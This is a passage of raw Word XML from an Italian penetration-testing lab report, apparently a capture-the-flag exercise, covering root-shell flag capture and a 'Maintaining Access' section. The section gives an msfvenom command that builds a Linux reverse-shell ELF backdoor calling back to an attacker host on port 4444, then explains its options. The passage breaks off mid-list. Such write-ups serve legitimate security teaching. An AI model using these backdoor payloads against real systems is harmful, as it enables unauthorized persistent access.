                          <w:p w14:paraId="15CB738A" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A00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FE943" id="_x0000_s1056" style="position:absolute;left:0;text-align:left;margin-left:.4pt;margin-top:27.85pt;width:220.75pt;height:10.9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ykUQIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X+x8dG2DOEXWIsOA&#10;oC3QDj0zshQbkCWNUmJnv36U7CZdt9Owi0KK9CP59JjFTddodpDoa2sKPh7lnEkjbFmbXcG/P68/&#10;XXHmA5gStDWy4Efp+c3y44dF6+ZyYiurS4mMQIyft67gVQhunmVeVLIBP7JOGgoqiw0EcnGXlQgt&#10;oTc6m+T556y1WDq0QnpPt3d9kC8TvlJShAelvAxMF5x6C+nEdG7jmS0XMN8huKoWQxvwD100UBsq&#10;eoK6gwBsj/UfUE0t0HqrwkjYJrNK1UKmGWiacf5umqcKnEyzEDnenWjy/w9W3B+e3CMSDa3zc09m&#10;nKJT2MRf6o91iazjiSzZBSbocnKVTyeXxKmg2Hh6Pc4vI5vZ+WuHPnyVtmHRKDjSYySO4LDxoU99&#10;TYnFjF3XWqcH0Ya1VOFilkd8IF0oDYHMxpUF92bHGegdCU4ETJDe6rqMn0cgj7vtrUZ2gPjo+Zd8&#10;nd6ZOvstLda+A1/1eSk0DKBNhJFJPkOrZ3aiFbptx2pqZZqQ49XWlsdHZGh7iXkn1jUV2IAPj4Ck&#10;KZqE9iQ80KG0pfHsYHFWWfz5t/uYT09NUc5a0iiN/mMPKDnT3wyJ4Ho8m0VRJ2d2cTkhB99Gtm8j&#10;Zt/cWmJkTBvpRDJjftCvpkLbvNA6rWJVCoERVLsneXBuQ787tJBCrlYpjYTsIGzMkxMRPFIXqX3u&#10;XgDd8PaBVHNvX/UM83cS6HN7Eaz2wao66ePMK+kqOrQESWHDwsYte+unrPPfyvIXAAAA//8DAFBL&#10;AwQUAAYACAAAACEA9XfUftwAAAAGAQAADwAAAGRycy9kb3ducmV2LnhtbEzOwU7CQBAG4LuJ77AZ&#10;E2+ylQLF2ikxJiYeIFHgAZbu0DZ2Z5vuAOXtXU94nPyT//+K1eg6daYhtJ4RnicJKOLK25ZrhP3u&#10;42kJKohhazrPhHClAKvy/q4wufUX/qbzVmoVSzjkBqER6XOtQ9WQM2Hie+KYHf3gjMRzqLUdzCWW&#10;u05Pk2ShnWk5LjSmp/eGqp/tySG4dfUyyGed7r/S5XXd7kQf3Qbx8WF8ewUlNMrtGf74kQ5lNB38&#10;iW1QHUJ0C8J8noGK6Ww2TUEdELJsAbos9H9++QsAAP//AwBQSwECLQAUAAYACAAAACEAtoM4kv4A&#10;AADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAIAAAA&#10;IQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAIAAAA&#10;IQDs+lykUQIAAJ4EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQABgAI&#10;AAAAIQD1d9R+3AAAAAYBAAAPAAAAAAAAAAAAAAAAAKsEAABkcnMvZG93bnJldi54bWxQSwUGAAAA&#10;AAQABADzAAAAtAUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="15CB738A" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A0050">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251714560" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="230F3574" wp14:editId="3EDD3F71">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>18355</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>126968</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="467211" cy="126814"/>
                <wp:effectExtent l="0" t="0" r="28575" b="26035"/>
                <wp:wrapNone/>
                <wp:docPr id="1152232733" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="467211" cy="126814"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="74608D60" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A00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F3574" id="_x0000_s1057" style="position:absolute;left:0;text-align:left;margin-left:1.45pt;margin-top:10pt;width:36.8pt;height:10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q5UgIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X21nadoGcYqsRYYB&#10;RVugHXpWZCk2IIsapcTOfv0o2W2ybqdhF5kUKX48Pnpx3beG7RX6BmzJi7OcM2UlVI3dlvz78/rT&#10;JWc+CFsJA1aV/KA8v15+/LDo3FxNoAZTKWQUxPp550peh+DmWeZlrVrhz8ApS0YN2IpAKm6zCkVH&#10;0VuTTfJ8lnWAlUOQynu6vR2MfJnia61keNDaq8BMyam2kE5M5yae2XIh5lsUrm7kWIb4hypa0VhK&#10;+hbqVgTBdtj8EaptJIIHHc4ktBlo3UiVeqBuivxdN0+1cCr1QuB49waT/39h5f3+yT0iwdA5P/ck&#10;xi56jW38Un2sT2Ad3sBSfWCSLqezi0lRcCbJVExml8U0gpkdHzv04auClkWh5EizSBCJ/Z0Pg+ur&#10;S8xlYd0Yk+ZhLOtKPjmf5jQyKYgW2ohAYuuqknu75UyYLfFNBkwhPZimis9jII/bzY1Bthdx5vmX&#10;fJ3GTJX95hZz3wpfD37JNDZgbAyjEnvGUo/gRCn0m541VMrnIj6JVxuoDo/IEAaGeSfXDSW4Ez48&#10;CiRKUSe0JuGBDm2A2oNR4qwG/Pm3++hPkyYrZx1RlFr/sROoODPfLHHgqphOI6eTMj2/mJCCp5bN&#10;qcXu2hsgRGhkVF0So38wr6JGaF9om1YxK5mElZR7AHlUbsKwOrSPUq1WyY147ES4s09OxuARugjt&#10;c/8i0I2zD0Sae3ils5i/o8DgO5BgtQugm8SPI67Eq6jQDiSGjfsal+xUT17Hv8ryFwAAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAPihAsncAAAABgEAAA8AAABkcnMvZG93bnJldi54bWxMj8FuwjAQRO+V+Adr&#10;kXorDtBSSOMgVKlSD1RqgQ8w8ZJEjdeRvUD4+25P7Wk1mtHsm2I9+E5dMKY2kIHpJAOFVAXXUm3g&#10;sH97WIJKbMnZLhAauGGCdTm6K2zuwpW+8LLjWkkJpdwaaJj7XOtUNehtmoQeSbxTiN6yyFhrF+1V&#10;yn2nZ1m20N62JB8a2+Nrg9X37uwN+G21ivxezw+f8+Vt2+5Zn/yHMffjYfMCinHgvzD84gs6lMJ0&#10;DGdySXUGZisJyslkkdjPiydQRwOPonVZ6P/45Q8AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+&#10;AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAA&#10;ACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAA&#10;ACEAlLxquVICAACdBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYA&#10;CAAAACEA+KECydwAAAAGAQAADwAAAAAAAAAAAAAAAACsBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAA&#10;AAAEAAQA8wAAALUFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="74608D60" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="001A0050">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="001A0050">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3D059C90" wp14:editId="6E012562">
            <wp:extent cx="5274310" cy="1271905"/>
            <wp:effectExtent l="0" t="0" r="2540" b="4445"/>
            <wp:docPr id="742696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96929" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId59"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1271905"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="001A0050">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 27: root shell e lettura</w:t>
      </w:r>
      <w:r w:rsidR="00E70782">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B5EA1B" w14:textId="77777777" w:rsidR="001A0050" w:rsidRDefault="001A0050" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C4788D1" w14:textId="10C61BEF" w:rsidR="00C22492" w:rsidRDefault="00054D0B" w:rsidP="00054D0B">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r w:rsidRPr="00054D0B">
        <w:t>9.2 Mantaining Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8440FC" w14:textId="77777777" w:rsidR="00054D0B" w:rsidRDefault="00054D0B" w:rsidP="00054D0B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="SFRM1000" w:hAnsi="SFRM1000"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EDB9BA3" w14:textId="243A6EC8" w:rsidR="00054D0B" w:rsidRDefault="00054D0B" w:rsidP="00054D0B">
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve">Dopo aver effettuato il </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t>Privilege</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve"> Escalation sulla macchina target è necessario installare un meccanismo che consenta di mantenere l’accesso persistente a questa macchina. In particolare, è stato utilizzato un meccanismo di Operating System Backdoor.</w:t>
      </w:r>
      <w:r w:rsidRPr="00054D0B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00301ADD">
        <w:lastRenderedPageBreak/>
        <w:t>Recuperiamo alcune informazioni riguardo al sistema utilizzando il comando "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve"> -a", dove -a corrisponde all’opzione “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t>all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:t>”, cioè, ricaviamo tutte le informazioni.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B22806" w14:textId="1B703D7D" w:rsidR="00301ADD" w:rsidRDefault="00301ADD" w:rsidP="00301ADD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F79F1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="72F1C661" wp14:editId="3B1FDAF5">
            <wp:extent cx="5274310" cy="566420"/>
            <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
            <wp:docPr id="145822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22754" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId60"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="566420"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5353EFAB" w14:textId="5FAE033F" w:rsidR="00301ADD" w:rsidRDefault="00301ADD" w:rsidP="00301ADD">
      <w:r>
        <w:t xml:space="preserve">Nella </w:t>
      </w:r>
      <w:r w:rsidRPr="00054D0B">
        <w:t xml:space="preserve">figura </w:t>
      </w:r>
      <w:r>
        <w:t>28</w:t>
      </w:r>
      <w:r w:rsidRPr="00054D0B">
        <w:t xml:space="preserve"> notiamo varie informazioni come la versione kernel e l’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00054D0B">
        <w:t>architettua</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00054D0B">
        <w:t xml:space="preserve"> x86.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B03C7A0" w14:textId="1EE412C5" w:rsidR="00301ADD" w:rsidRDefault="00301ADD" w:rsidP="00301ADD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Per creare una backdoor è stato utilizzato </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, con il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a x86 –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>platform</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>/x86/shell/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST=10.0.2.15 LPORT=4444 -f </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>shell.elf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C3D12">
        <w:rPr>
          <w:rFonts w:ascii="SFTI1000" w:eastAsia="Times New Roman" w:hAnsi="SFTI1000"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ci permette di generare il payload di una reverse shell dove:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B651FE" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>-a x86 rappresenta l’architettura da utilizzare per il payload;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326F41A0" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>platform</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> rappresenta il sistema operativo da utilizzare per il payload;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0D8779" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRPr="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">-p </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>/x86/shell/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> è il tipo di payload selezionato;</w:t>
      </w:r>
      <w:r w:rsidRPr="00301ADD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1451B30E" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRPr="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>LHOST=10.0.2.15 è l’indirizzo IP della macchina Kali che permetterà di instaurare una connessione reverse con la macchina target</w:t>
      </w:r>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:ascii="SFRM1000" w:eastAsia="Times New Roman" w:hAnsi="SFRM1000" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31967F46" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>LPORT=4444 è la porta sulla quale sarà stabilità la connessione;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFECE3D" w14:textId="77777777" w:rsidR="00301ADD" w:rsidRDefault="00301ADD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">-f </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00301ADD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>elf</w:t>
      </w:r>
